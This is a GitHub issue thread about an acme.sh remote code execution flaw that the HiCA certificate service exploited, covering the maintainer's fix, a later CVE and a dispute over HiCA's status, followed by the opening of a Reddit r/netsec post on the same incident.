[IMG_7913](https://private-user-images.githubusercontent.com/6964962/244681141-9ea8e3e2-3e10-43a6-a296-1a0e508d66eb.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTg4MzEsIm5iZiI6MTczNjUxODUzMSwicGF0aCI6Ii82OTY0OTYyLzI0NDY4MTE0MS05ZWE4ZTNlMi0zZTEwLTQzYTYtYTI5Ni0xYTBlNTA4ZDY2ZWIucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTBUMTQxNTMxWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MWY4NjY5YjRhMzdiNThmMDY5M2Q2MWNmNTJiMzE3YTQyNDc3ZjcxYjZmNzYxYzY2MDJkZWQ5MDk1NDkzNGQxYiZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.PL7NmPtzQVHWQFgnynXYY_L6v7W4pS7hYEuV_V2UPmc)  This is an experimental project, we even don’t have time to fix the problem about the payment gateway expiration. (QR code is not executable for payment). So this project is totally a nonprofit. |
| --- |

 👎
13
 qbe, boomer41, LaoshuBaby, shanoaice, iammeken, krishukr, undefined-moe, LeviMarvin, laosb, lumedmh, and 3 more reacted with thumbs down emoji
 😄
1
 qbe reacted with laugh emoji
 🎉
1
 qbe reacted with hooray emoji

All reactions

* 👎
  13 reactions
* 😄
  1 reaction
* 🎉
  1 reaction

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584440327)

| We must forbidden the HiCA. It is destroying the security of ACME.  you have no necessary to do this, we have turned all servers down. |
| --- |

 👎
13
 qbe, boomer41, LaoshuBaby, lumedmh, shanoaice, iammeken, isyekong, undefined-moe, LeviMarvin, alkoclick, and 3 more reacted with thumbs down emoji
 😄
2
 qbe and xiaohuilam reacted with laugh emoji
 🎉
2
 qbe and xiaohuilam reacted with hooray emoji

All reactions

* 👎
  13 reactions
* 😄
  2 reactions
* 🎉
  2 reactions

Sorry, something went wrong.

[gentoo-bot](/gentoo-bot)
pushed a commit
to gentoo/gentoo
that referenced
this issue
[Jun 9, 2023](#ref-commit-eaf6574)
[![@thesamesam](https://avatars.githubusercontent.com/u/11667869?s=40&u=f2fd8b8e54abb2f4cb97222f8c4762ae076e3847&v=4)](/thesamesam)

`[profiles: mask app-crypt/acme-sh](/gentoo/gentoo/commit/eaf65747638e7864fc50d9149cde5271893a7365 "profiles: mask app-crypt/acme-sh

Bug: https://github.com/acmesh-official/acme.sh/issues/4659
Bug: https://bugs.gentoo.org/908104
Signed-off-by: Sam James <sam@gentoo.org>")`
…

`[eaf6574](/gentoo/gentoo/commit/eaf65747638e7864fc50d9149cde5271893a7365)`

```
Bug: [acmesh-official/acme.sh#4659](https://github.com/acmesh-official/acme.sh/issues/4659)
Bug: <https://bugs.gentoo.org/908104>
Signed-off-by: Sam James <sam@gentoo.org>
```

[![@qwerzl](https://avatars.githubusercontent.com/u/46770502?s=80&u=ee4125217560161ec9943476ff21a4ae19596a38&v=4)](/qwerzl)

Copy link

### **[qwerzl](/qwerzl)** commented [Jun 9, 2023](#issuecomment-1584460325)

| You actually have good intentions. However you need to understand that this world needs regulations to work. |
| --- |

 🎉
5
 xiaohuilam, undefined-moe, Wittoy, zhongfu, and Mosney reacted with hooray emoji

All reactions

* 🎉
  5 reactions

Sorry, something went wrong.

[![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=80&v=4)](/Neilpang)

Copy link

Member

### **[Neilpang](/Neilpang)** commented [Jun 9, 2023](#issuecomment-1584465169)

| as a quick fix, I just removed the problematic "\_exec" from that line. |
| --- |

 👍
3
 xiaohuilam, LeviMarvin, and qbe reacted with thumbs up emoji
 ❤️
1
 tedb reacted with heart emoji

All reactions

* 👍
  3 reactions
* ❤️
  1 reaction

Sorry, something went wrong.

[![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=40&v=4)](/Neilpang)
[Neilpang](/Neilpang)
closed this as [completed](/acmesh-official/acme.sh/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
in
`[4c30250](/acmesh-official/acme.sh/commit/4c30250782ff7440ca5ceeddb066a67ca450fcc7)`
[Jun 9, 2023](#event-9483715402)

[![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=80&v=4)](/Neilpang)

Copy link

Member

### **[Neilpang](/Neilpang)** commented [Jun 9, 2023](#issuecomment-1584469832)

| merged to master. new release will be soon. |
| --- |

All reactions

Sorry, something went wrong.

[![@iammeken](https://avatars.githubusercontent.com/u/67883286?s=80&u=a5efa30d17da42e000d274722391f7458bab4fd1&v=4)](/iammeken)

Copy link

### **[iammeken](/iammeken)** commented [Jun 9, 2023](#issuecomment-1584471433)

| You should not close this issue at this stage. |
| --- |

 👍
4
 boomer41, lumedmh, zhongfu, and Mosney reacted with thumbs up emoji

All reactions

* 👍
  4 reactions

Sorry, something went wrong.

[![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=40&v=4)](/Neilpang)
[Neilpang](/Neilpang)
reopened this
[Jun 9, 2023](#event-9483735772)

1 hidden item

Load more…

[Neilpang](/Neilpang)
pushed a commit
that referenced
this issue
[Jun 9, 2023](#ref-commit-327e2fb)

`[remove all exec.](/acmesh-official/acme.sh/commit/327e2fb0a4bdbe4b75339e1cad6d20bda29318d6 "remove all exec.
https://github.com/acmesh-official/acme.sh/issues/4659")`
…

`[327e2fb](/acmesh-official/acme.sh/commit/327e2fb0a4bdbe4b75339e1cad6d20bda29318d6)`

```
[#4659](https://github.com/acmesh-official/acme.sh/issues/4659)
```

[![@soliton-](https://avatars.githubusercontent.com/u/3579817?s=40&v=4)](/soliton-)
[soliton-](/soliton-)
mentioned this issue
[Jun 9, 2023](#ref-pullrequest-1749789169)

[Avoid unnecessary eval
#4662](/acmesh-official/acme.sh/pull/4662)
 Closed

[![@BeSafee](https://avatars.githubusercontent.com/u/136086436?s=80&v=4)](/BeSafee)

Copy link

### **[BeSafee](/BeSafee)** commented [Jun 9, 2023](#issuecomment-1584488230)

| HiCA didn't respond properly to this issue, incredible that they shut down all their servers and official website. |
| --- |

 👍
7
 laosb, LeviMarvin, wojtekregis, zhongfu, Losses, bunnyblueair, and Mosney reacted with thumbs up emoji
 👎
1
 xiaohuilam reacted with thumbs down emoji

All reactions

* 👍
  7 reactions
* 👎
  1 reaction

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584495685) • edited Loading

| HiCA didn't respond properly to this issue, incredible that they shut down all their servers and official website.  Which question I didn’t reply, May I ask? We shutdown servers is not only to reduce impact for that RCA, but also reduce billing cost by DDoS happen hours ago. |
| --- |

All reactions

Sorry, something went wrong.

[![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=80&u=66386693132a46e3f1ba798f03d58e914ffa1ec9&v=4)](/LeviMarvin)

Copy link

### **[LeviMarvin](/LeviMarvin)** commented [Jun 9, 2023](#issuecomment-1584502258)

| Is there any information about HiCA's certificate of CA which like sha1-hash and keyid, so that I can revoke/disable the HiCA trust-chain in local. And I think this issue should be reported to public, and make decision for revoking the CA certificate of HiCA to all people. |
| --- |

 👍
1
 LeviMarvin reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@BeSafee](https://avatars.githubusercontent.com/u/136086436?s=80&v=4)](/BeSafee)

Copy link

### **[BeSafee](/BeSafee)** commented [Jun 9, 2023](#issuecomment-1584502723)

| And their payment gateway (<https://tencentcloud.accelerate.pki.plus/>) redirects to the White House website. The whole process is opaque and worrying. Hope HiCA can give a formal response to this issue. |
| --- |

 👍
2
 LeviMarvin and Mosney reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584503675)

| And their payment gateway (<https://tencentcloud.accelerate.pki.plus/>) redirects to the White House website. The whole process is opaque and worrying. Hope HiCA can give a formal response to this issue.  This is the WAF rule. |
| --- |

 👎
1
 bunnyblueair reacted with thumbs down emoji
 😄
2
 komuw and Misterio77 reacted with laugh emoji
 🎉
1
 komuw reacted with hooray emoji

All reactions

* 👎
  1 reaction
* 😄
  2 reactions
* 🎉
  1 reaction

Sorry, something went wrong.

[![@j-mie](https://avatars.githubusercontent.com/u/1857320?s=80&u=d5b43f2d599d6c85bd461d69fbf672d0a5821710&v=4)](/j-mie)

Copy link

### **[j-mie](/j-mie)** commented [Jun 9, 2023](#issuecomment-1584512146)

| [@Neilpang](https://github.com/Neilpang) You should probably request a CVE for this. |
| --- |

 👍
2
 matty234 and alexanderkjall reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

Sorry, something went wrong.

[![@komuw](https://avatars.githubusercontent.com/u/5163857?s=80&u=43f609098ad50ac90777ac0ba965c0add877458d&v=4)](/komuw)

Copy link

### **[komuw](/komuw)** commented [Jun 9, 2023](#issuecomment-1584513904)

| And their payment gateway (<https://tencentcloud.accelerate.pki.plus/>) redirects to the White House website. The whole process is opaque and worrying. Hope HiCA can give a formal response to this issue.  This is the WAF rule.  🤣 well played. |
| --- |

All reactions

Sorry, something went wrong.

[![@boomer41](https://avatars.githubusercontent.com/u/1922978?s=80&u=b7199702d8e30989a1f836a5bf2d9f6c2c3194a6&v=4)](/boomer41)

Copy link

### **[boomer41](/boomer41)** commented [Jun 9, 2023](#issuecomment-1584515104)

| Which question I didn’t reply, May I ask?  As you see yourself as a proper CA, the following text is based on that fact. Most publicly trusted CAs thesedays go through Mozilla's CA Certificate Program [1], which exhibits strict policies around required communication around issues.  See for example this (minor) incident, where a CA failed to publicly disclose one of their intermediate certificates to the public in a timely manner: <https://bugzilla.mozilla.org/show_bug.cgi?id=1784820> Especially the last comment by the CA shows how to properly answer to such a problem. They publicly disclose what ultimately was the problem and how the CA wants to proceed, and how they ensure these problems will not occur again. If the CA would fail to provide these statements, it ultimately would get removed from the program, as you cannot and must not play with the trust Mozilla has given that CA under any circumstances.  Operating any kind of CA where the certificates are trusted globally is no joke, because that CA can potentially fake certificates for banking services and such.  However, in my opinion, just yoinking your services down and creating some WAF rules that redirect to the white house (why even THAT site? Show a 403 forbidden or something) is not something I personally see trust in.  [1] <https://wiki.mozilla.org/CA> |
| --- |

 👍
6
 matty234, iammeken, LeviMarvin, bbbush, thesamesam, and Mosney reacted with thumbs up emoji

All reactions

* 👍
  6 reactions

Sorry, something went wrong.

[![@BeSafee](https://avatars.githubusercontent.com/u/136086436?s=80&v=4)](/BeSafee)

Copy link

### **[BeSafee](/BeSafee)** commented [Jun 9, 2023](#issuecomment-1584519718)

| In the Google snapshot I see HiCA official recommends to run acme.sh as root user. |
| --- |

 😄
1
 Mosney reacted with laugh emoji

All reactions

* 😄
  1 reaction

Sorry, something went wrong.

[![@Midar](https://avatars.githubusercontent.com/u/752237?s=80&u=81dfb9be718247c7664693c556bf3fdfb6715545&v=4)](/Midar)

Copy link

### **[Midar](/Midar)** commented [Jun 9, 2023](#issuecomment-1584520710)

| Hey, um, this is the acme.sh bug tracker. This bug is about an RCE in acme.sh, and possibly there are other places in the code with the same issue. Can we please keep the discussion on that rather than some random CA that just happened to exploit this RCE? The CA is not the problem in this bug (take this to the CA forum), but the defect in the code is.  Personally, I’m not using this CA, but am now getting spammed for this because people abuse this bug to talk about some CA rather than the bug - and I guess a lot of others are in the same situation as I. Use the correct venue please. |
| --- |

 👍
9
 boomer41, codl, jani, ras52, shankerwangmiao, mvdan, PhotonQuantum, Alan-Liang, and Mosney reacted with thumbs up emoji

All reactions

* 👍
  9 reactions

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584520775) • edited Loading

| Which question I didn’t reply, May I ask?  As you see yourself as a proper CA, the following text is based on that fact. Most publicly trusted CAs thesedays go through Mozilla's CA Certificate Program [1], which exhibits strict policies around required communication around issues.  See for example this (minor) incident, where a CA failed to publicly disclose one of their intermediate certificates to the public in a timely manner: <https://bugzilla.mozilla.org/show_bug.cgi?id=1784820> Especially the last comment by the CA shows how to properly answer to such a problem. They publicly disclose what ultimately was the problem and how the CA wants to proceed, and how they ensure these problems will not occur again. If the CA would fail to provide these statements, it ultimately would get removed from the program, as you cannot and must not play with the trust Mozilla has given that CA under any circumstances.  Operating any kind of CA where the certificates are trusted globally is no joke, because that CA can potentially fake certificates for banking services and such.  However, in my opinion, just yoinking your services down and creating some WAF rules that redirect to the white house (why even THAT site? Show a 403 forbidden or something) is not something I personally see trust in.  [1] <https://wiki.mozilla.org/CA>  We ARE NOT a CA. Our certs is issued by SSL.com、Sectigo、GTS，by be compliant their BR validation requirements.  We ARE reseller or subscriber of those CAs, so we don’t have needed to match webtrust standards because we don’t provide any PKI infrastructure. |
| --- |

 👎
2
 boomer41 and LeviMarvin reacted with thumbs down emoji
 😄
1
 codl reacted with laugh emoji

All reactions

* 👎
  2 reactions
* 😄
  1 reaction

Sorry, something went wrong.

[![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=80&u=66386693132a46e3f1ba798f03d58e914ffa1ec9&v=4)](/LeviMarvin)

Copy link

### **[LeviMarvin](/LeviMarvin)** commented [Jun 9, 2023](#issuecomment-1584524210) • edited Loading

| [@xiaohuilam](https://github.com/xiaohuilam) Your company (or your CA's company) is registered in China, the code of company is `91500108MAACDXG09T` and contact phone number is `+86 17099911119`, contact mail is `sslcertificate@foxmail.com`/`contact@xunsign.com`. your official website `www1.hi.cn` have not used the certificate signed from your own CA. Your company is selling of prepare to sell PKI services after permitted by government. So we have reason believe that your are an CA. |
| --- |

 👍
1
 LeviMarvin reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584526323) • edited Loading

| In the Google snapshot I see HiCA official recommends to run acme.sh as root user. [@BeSafee](https://github.com/BeSafee)  It’s tutorial copied from others article. NOT we meant.  the source article is http://[web.archive.org/web/20230201113221/https://blog.freessl.cn/acme-quick-start/](https://blog.freessl.cn/acme-quick-start/). |
| --- |

All reactions

Sorry, something went wrong.

[![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=80&u=66386693132a46e3f1ba798f03d58e914ffa1ec9&v=4)](/LeviMarvin)

Copy link

### **[LeviMarvin](/LeviMarvin)** commented [Jun 9, 2023](#issuecomment-1584531292)

| [@xiaohuilam](https://github.com/xiaohuilam) If you are not a CA, you have NOT ANY reasons to sell the certificate or publish the payment information with ACME users. And in your website, you said "We provide OCSP in China Mainland", how did you do that? The OCSP services must be operated by CA. |
| --- |

 👀
1
 Mosney reacted with eyes emoji

All reactions

* 👀
  1 reaction

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584534072)

| [@xiaohuilam](https://github.com/xiaohuilam) Your company (or your CA's company) is registered in China, the code of company is `91500108MAACDXG09T` and contact phone number is `+86 17099911119`, contact mail is `sslcertificate@foxmail.com`/`contact@xunsign.com`. your official website `www1.hi.cn` have not used the certificate signed from your own CA. Your company is selling of prepare to sell PKI services after permitted by government. So we have reason believe that your are an CA.  We're not a CA, we have no public key infrastructures including public CA or private CA. And a kind remind, submitting information here such as telephone、addresses that not evidence without our consent will violate China citizen privacy. |
| --- |

 👎
2
 bunnyblueair and LeviMarvin reacted with thumbs down emoji

All reactions

* 👎
  2 reactions

Sorry, something went wrong.

[![@boomer41](https://avatars.githubusercontent.com/u/1922978?s=80&u=b7199702d8e30989a1f836a5bf2d9f6c2c3194a6&v=4)](/boomer41)

Copy link

### **[boomer41](/boomer41)** commented [Jun 9, 2023](#issuecomment-1584534356)

| Hey, um, this is the acme.sh bug tracker. This bug is about an RCE in acme.sh, and possibly there are other places in the code with the same issue. Can we please keep the discussion on that rather than some random CA that just happened to exploit this RCE? The CA is not the problem in this bug (take this to the CA forum), but the defect in the code is.  Personally, I’m not using this CA, but am now getting spammed for this because people abuse this bug to talk about some CA rather than the bug - and I guess a lot of others are in the same situation as I. Use the correct venue please.  [@LeviMarvin](https://github.com/LeviMarvin) [@xiaohuilam](https://github.com/xiaohuilam) Please see the above request of Midar. I'm 100% with him. This issue is really not for discussion about the CA in question, but for the bug in acme.sh. I'd gladly like to request discussing in private about that issue if needs arise, and stop spamming my inbox about whether the CA is now a CA or not.  Thanks. |
| --- |

 👍
3
 ras52, DejavuMoe, and LeviMarvin reacted with thumbs up emoji

All reactions

* 👍
  3 reactions

Sorry, something went wrong.

[![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=80&u=66386693132a46e3f1ba798f03d58e914ffa1ec9&v=4)](/LeviMarvin)

Copy link

### **[LeviMarvin](/LeviMarvin)** commented [Jun 9, 2023](#issuecomment-1584535248)

| [@xiaohuilam](https://github.com/xiaohuilam) As of now, you have not given a formal explanation (including the reasons for doing so) on "using the ACME client for commercial activities", but continue to quibble in this issue. At the same time, you said that the HiCA server has been shut down, and some traffic is redirected to the White House page because of WAF operation. Why do you (and your company) configure this WAF rule? It is even more scandalous if traffic is directed to a third-party site just to prevent DDos attacks. |
| --- |

 👍
1
 Mosney reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=80&u=66386693132a46e3f1ba798f03d58e914ffa1ec9&v=4)](/LeviMarvin)

Copy link

### **[LeviMarvin](/LeviMarvin)** commented [Jun 9, 2023](#issuecomment-1584537108) • edited Loading

| [@xiaohuilam](https://github.com/xiaohuilam) Your company (or your CA's company) is registered in China, the code of company is `91500108MAACDXG09T` and contact phone number is `+86 17099911119`, contact mail is `sslcertificate@foxmail.com`/`contact@xunsign.com`. your official website `www1.hi.cn` have not used the certificate signed from your own CA. Your company is selling of prepare to sell PKI services after permitted by government. So we have reason believe that your are an CA.  We're not a CA, we have no public key infrastructures including public CA or private CA. And a kind remind, submitting information here such as telephone、addresses that not evidence without our consent will violate China citizen privacy.  All of information is published by yourself (or your company-self) to public. This is mandatory under Chinese law and does not violate your privacy. All of information can be accessed from anywhere and not need to be authoried publish. This is in line with Chinese law. All information is voluntarily disclosed by the company, and there is no need to declare it separately on the company's official website. If you don't want to, I can provide the URL of the China National Enterprise Credit Information Publicity System for your own reference. |
| --- |

 👍
3
 bunnyblueair, LeviMarvin, and Mosney reacted with thumbs up emoji

All reactions

* 👍
  3 reactions

Sorry, something went wrong.

[![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=80&u=66386693132a46e3f1ba798f03d58e914ffa1ec9&v=4)](/LeviMarvin)

Copy link

### **[LeviMarvin](/LeviMarvin)** commented [Jun 9, 2023](#issuecomment-1584539243)

| [@boomer41](https://github.com/boomer41) Of course. |
| --- |

 👍
2
 boomer41 and LeviMarvin reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584540452)

| [@xiaohuilam](https://github.com/xiaohuilam) As of now, you have not given a formal explanation (including the reasons for doing so) on "using the ACME client for commercial activities", but continue to quibble in this issue. At the same time, you said that the HiCA server has been shut down, and some traffic is redirected to the White House page because of WAF operation. Why do you (and your company) configure this WAF rule? It is even more scandalous if traffic is directed to a third-party site just to prevent DDos attacks.  Commercialization abilities is the QRCode output part, which isn't the RCE. it has no security concern. (No potential risks to local server actually, and how to category the QRCode outputs if you are a CVE reviewer?) |
| --- |

 👎
2
 bunnyblueair and LeviMarvin reacted with thumbs down emoji

All reactions

* 👎
  2 reactions

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584541532) • edited Loading

| [@xiaohuilam](https://github.com/xiaohuilam) Your company (or your CA's company) is registered in China, the code of company is `91500108MAACDXG09T` and contact phone number is `+86 17099911119`, contact mail is `sslcertificate@foxmail.com`/`contact@xunsign.com`. your official website `www1.hi.cn` have not used the certificate signed from your own CA. Your company is selling of prepare to sell PKI services after permitted by government. So we have reason believe that your are an CA.  We're not a CA, we have no public key infrastructures including public CA or private CA. And a kind remind, submitting information here such as telephone、addresses that not evidence without our consent will violate China citizen privacy.  All of informations is published by yourself (or your company-self) to public. This is mandatory under Chinese law and does not violate your privacy.  But it's on our site, we never authorized you to disclosure anywhere else.  Even we published our photo on our website, we reserves all the copyright and privacy. But you shared at social media this is totally violate for them. |
| --- |

 👎
5
 bunnyblueair, byhemechi, boomer41, andrewnicolalde, and LeviMarvin reacted with thumbs down emoji
 😄
5
 byhemechi, boomer41, iammeken, andrewnicolalde, and Mosney reacted with laugh emoji

All reactions

* 👎
  5 reactions
* 😄
  5 reactions

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584546150)

| [@xiaohuilam](https://github.com/xiaohuilam) If you are not a CA, you have NOT ANY reasons to sell the certificate or publish the payment information with ACME users. And in your website, you said "We provide OCSP in China Mainland", how did you do that? The OCSP services must be operated by CA.   * Q: We provide OCSP in China Mainland * A: We are a SSL.com partner co operated a intermediate CA which hosts ocsp responder in China. And also sometimes we redirects cert provider to GTS(Google Trust Services), it hosts ocsp.pki.goog which has ocsp responder datacenter in China. So this isn't the evidence to proof HiCA is a CA which managed PKI. |
| --- |

All reactions

Sorry, something went wrong.

[![@Scirese](https://avatars.githubusercontent.com/u/62688390?s=80&u=9f1df8e71e5c30fab6391455dbc1fbaa7fea2881&v=4)](/Scirese)

Copy link

### **[Scirese](/Scirese)** commented [Jun 9, 2023](#issuecomment-1584549830)

| [@Neilpang](https://github.com/Neilpang) The discussion is completely heading to off-topic and heated, we should lock the issue now |
| --- |

 👍
3
 mritzmann, xiaohuilam, and ramonacat reacted with thumbs up emoji

All reactions

* 👍
  3 reactions

Sorry, something went wrong.

[![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=80&u=66386693132a46e3f1ba798f03d58e914ffa1ec9&v=4)](/LeviMarvin)

Copy link

### **[LeviMarvin](/LeviMarvin)** commented [Jun 9, 2023](#issuecomment-1584552155)

| We should start a new issue to disscusion the bug about ACME. HiCA's problem will be reported to CA/B. |
| --- |

 👍
4
 LeviMarvin, mweinelt, bunnyblueair, and Mosney reacted with thumbs up emoji

All reactions

* 👍
  4 reactions

Sorry, something went wrong.

[![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=80&v=4)](/Neilpang)

Copy link

Member

### **[Neilpang](/Neilpang)** commented [Jun 9, 2023](#issuecomment-1584561604) • edited Loading

| sorry guys, new release is out. <https://github.com/acmesh-official/acme.sh/releases>  All the "exec" are removed, that was originally added for a better display of the error message.  If you have any more bugs found, please let me know. |
| --- |

 👍
4
 dconry, xiaohuilam, Mosney, and LeviMarvin reacted with thumbs up emoji

All reactions

* 👍
  4 reactions

Sorry, something went wrong.

[![@acmesh-official](https://avatars.githubusercontent.com/u/60454762?s=40&v=4)](/acmesh-official)
[acmesh-official](/acmesh-official)
locked as **off-topic** and limited conversation to collaborators
[Jun 9, 2023](#event-9484432007)

[![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=80&v=4)](/Neilpang)

Copy link

Member

### **[Neilpang](/Neilpang)** commented [Jul 14, 2023](#issuecomment-1635110068)

| someone created a CVE: <https://www.cve.org/CVERecord?id=CVE-2023-38198> |
| --- |

All reactions

Sorry, something went wrong.

[![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=40&v=4)](/Neilpang)
[Neilpang](/Neilpang)
closed this as [completed](/acmesh-official/acme.sh/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Jul 14, 2023](#event-9816739452)

[Sign up for free](/join?source=comment-repo)
**to subscribe to this conversation on GitHub**.
Already have an account?
[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Facmesh-official%2Facme.sh%2Fissues%2F4659).

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

21 participants

[![@mikma](https://avatars.githubusercontent.com/u/56008?s=52&v=4)](/mikma) [![@Finkregh](https://avatars.githubusercontent.com/u/518090?s=52&v=4)](/Finkregh) [![@Midar](https://avatars.githubusercontent.com/u/752237?s=52&v=4)](/Midar) [![@mholt](https://avatars.githubusercontent.com/u/1128849?s=52&v=4)](/mholt) [![@aaomidi](https://avatars.githubusercontent.com/u/1465785?s=52&v=4)](/aaomidi) [![@jdkasten](https://avatars.githubusercontent.com/u/1581662?s=52&v=4)](/jdkasten) [![@j-mie](https://avatars.githubusercontent.com/u/1857320?s=52&v=4)](/j-mie) [![@boomer41](https://avatars.githubusercontent.com/u/1922978?s=52&v=4)](/boomer41) [![@mvdan](https://avatars.githubusercontent.com/u/3576549?s=52&v=4)](/mvdan) [![@komuw](https://avatars.githubusercontent.com/u/5163857?s=52&v=4)](/komuw) [![@shankerwangmiao](https://avatars.githubusercontent.com/u/6825907?s=52&v=4)](/shankerwangmiao) [![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=52&v=4)](/xiaohuilam) [![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=52&v=4)](/Neilpang) [![@PPazderski](https://avatars.githubusercontent.com/u/13628240?s=52&v=4)](/PPazderski) [![@Alan-Liang](https://avatars.githubusercontent.com/u/16379418?s=52&v=4)](/Alan-Liang) [![@PhotonQuantum](https://avatars.githubusercontent.com/u/18749973?s=52&v=4)](/PhotonQuantum) [![@qwerzl](https://avatars.githubusercontent.com/u/46770502?s=52&v=4)](/qwerzl) [![@Scirese](https://avatars.githubusercontent.com/u/62688390?s=52&v=4)](/Scirese) [![@iammeken](https://avatars.githubusercontent.com/u/67883286?s=52&v=4)](/iammeken) [![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=52&v=4)](/LeviMarvin) and others

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.reddit.com_d08042d6_20250110_141537.html ===

[Skip to main content](#main-content)

Reddit and its partners use cookies and similar technologies to provide you with a better experience.

By accepting all cookies, you agree to our use of cookies to deliver and maintain our services and site, improve the quality of Reddit, personalize Reddit content and advertising, and measure the effectiveness of advertising.

By rejecting non-essential cookies, Reddit may still use certain cookies to ensure the proper functionality of our platform.

For more information, please see our
[Cookie Notice](https://reddit.com/en-us/policies/cookies)
and our
[Privacy Policy](https://reddit.com/en-us/policies/privacy-policy).

Open menu

Open navigation
Go to Reddit Home

r/netsec

A chip

A close button

Get App

Get the Reddit app

[Log In](https://www.reddit.com/login/)Log in to Reddit

Expand user menu
Open settings menu

* [Log In / Sign Up](https://www.reddit.com/login/)
* [Advertise on Reddit](https://accounts.reddit.com/adsregister?utm_source=web3x_consumer&utm_name=user_menu_cta)
* [Shop Collectible Avatars](/avatar/shop)

[![r/netsec icon](https://styles.redditmedia.com/t5_1rqwi/styles/communityIcon_ldtzxmwbf8e91.png)

Go to netsec](/r/netsec/)

[r/netsec](/r/netsec/)
![r/netsec icon](https://styles.redditmedia.com/t5_1rqwi/styles/communityIcon_ldtzxmwbf8e91.png)

[r/netsec](/r/netsec/)

/r/netsec is a community-curated aggregator of technical information security content. Our mission is to extract signal from the noise — to provide value to security practitioners, students, researchers, and hackers everywhere.
‎

---

Members

Online

•

[tubularobot](/user/tubularobot/)

ADMIN

MOD

# acme.sh runs arbitrary commands from a remote server

